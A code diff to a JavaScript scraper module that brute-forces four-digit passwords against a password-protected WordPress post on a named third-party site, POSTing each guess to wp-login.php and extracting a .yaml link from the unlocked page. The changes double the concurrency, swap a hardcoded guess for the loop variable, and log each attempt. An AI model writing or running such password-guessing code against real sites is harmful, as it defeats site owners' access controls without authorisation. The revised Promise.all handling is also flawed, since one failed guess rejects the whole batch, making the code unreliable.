@@ -9,25 +9,28 @@ export default {
   getContent: async () => {
     try {
       const arr = cracker.numberCrack(4);
-      const concurrencyLimit = 10;
+      const concurrencyLimit = 20;
 
       let link = null;
       for (let i = 0; i < arr.length; i += concurrencyLimit) {
         const tasks = arr.slice(i, i + concurrencyLimit).map(async password => {
-          return await new Promise(async resolve => {
+          return await new Promise(async (resolve, reject) => {
             try {
+              logger.info('maskedman test password: ' + password);
               const regex = /(https?:\/\/.*?\.yaml)(?=\")/gm;
               const body = await getBody(password);
-              logger.info(password);
               const link = regex.exec(body)[1];
               console.log('maskedman密码: ' + password);
               console.log('maskedman链接: ' + link);
               resolve(link);
-            } catch {}
+            } catch (err) {
+              reject(null);
+            }
           });
         });
-        link = await Promise.race(tasks);
-        if (link) {
+        const links = (await Promise.all(tasks).then(res => res)).filter(Boolean);
+        if (links && links.length > 0) {
+          link = links[0];
           break;
         }
       }
@@ -41,7 +44,7 @@ export default {
 const getBody = async password => {
   const cookie = await new Promise((resolve, reject) => {
     unirest('POST', 'https://halekj.top/wp-login.php?action=postpass')
-      .send('post_password=0011')
+      .send('post_password=' + password)
       .send('Submit=提交')
       .end(response => {
         if (response.error) {
